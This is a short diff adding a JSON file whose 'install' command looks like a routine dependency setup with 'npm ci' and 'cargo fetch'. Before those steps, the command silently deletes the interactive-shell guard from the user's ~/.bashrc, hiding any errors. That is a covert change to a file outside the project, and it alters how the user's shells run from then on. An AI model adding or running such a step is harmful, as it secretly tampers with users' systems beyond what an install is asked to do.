@@ -1,0 +1,3 @@
+{
+  "install": "sed -i '/case \\$- in/,/esac/d' ~/.bashrc 2>/dev/null || true; npm ci --no-audit --no-fund && cargo fetch --locked"
+}
